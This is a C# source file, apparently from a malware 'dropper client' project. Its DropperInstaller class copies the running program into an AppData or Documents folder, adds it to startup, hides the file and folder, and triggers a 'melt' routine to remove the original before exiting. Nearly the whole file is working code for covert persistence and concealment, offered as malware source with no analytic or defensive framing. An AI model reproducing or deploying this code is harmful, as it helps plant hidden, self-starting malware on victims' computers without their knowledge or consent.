using System;
using System.IO;

namespace DropperClient.Installation
{
    public class DropperInstaller
    {
        public enum InstallLocation { AppData, Documents }

        private readonly InstallLocation _installLocation;

        private readonly ExecutableInfo runningAssembly;

        /// <summary>
        /// Provides functions to install the dropper client
        /// </summary>
        /// <param name="hideFile">Set to true if the installation directory should be hidden</param>
        /// <param name="installLocation">Directory to install the dropper client to</param>
        public DropperInstaller(bool hideFile, InstallLocation installLocation)
        {
            _installLocation = installLocation;
            runningAssembly = new ExecutableInfo();
        }

        /// <summary>
        /// Attempts to install the dropper client to the previously chosen directory.
        /// </summary>
        public void Install()
        {
            var startupManager = new StartupManager();

            var targetFolderPath = GetInstallFolderPath(_installLocation);
            if (targetFolderPath == null) return;

            var targetExecutablePath = Path.Combine(targetFolderPath, runningAssembly.AssemblyName);

            if (!IsInstalled(targetExecutablePath))
            {
                runningAssembly.Move(targetExecutablePath);
                startupManager.AddToStartup(runningAssembly.AssemblyName, targetExecutablePath);

                if (Settings.Hide)
                {
                    var fInfo = new FileInfo(targetExecutablePath);
                    var dInfo = new FileInfo(targetFolderPath);

                    try
                    {
                        dInfo.Attributes = FileAttributes.Hidden;
                        fInfo.Attributes = FileAttributes.Hidden;
                    }
                    catch
                    {
                        return;
                    }
                }

                runningAssembly.StartMelt();
                Environment.Exit(0);
            }
        }

        /// <summary>
        /// Checks if the dropper already is installed
        /// </summary>
        /// <param name="filePath">Path to where the executable should be installed</param>
        /// <returns></returns>
        public bool IsInstalled(string filePath)
        {
            return File.Exists(filePath);
        }

        /// <summary>
        /// Gets the folder path for the chosen installlocation
        /// </summary>
        /// <param name="location"></param>
        /// <returns></returns>
        private string GetInstallFolderPath(InstallLocation location)
        {
            Environment.SpecialFolder specialDirectory;

            var folderName = runningAssembly.AssemblyName.Replace(".exe", "");

            switch (location)
            {
                case InstallLocation.AppData:
                    specialDirectory = Environment.SpecialFolder.ApplicationData;
                    break;

                case InstallLocation.Documents:
                    specialDirectory = Environment.SpecialFolder.MyDocuments;
                    break;

                default:
                    specialDirectory = Environment.SpecialFolder.MyDocuments;
                    break;
            }

            string targetFolderPath = Path.Combine(Environment.GetFolderPath(specialDirectory), folderName);
            try
            {
                Directory.CreateDirectory(targetFolderPath);
            }
            catch
            {
                return null;
            }

            return targetFolderPath;
        }
    }
}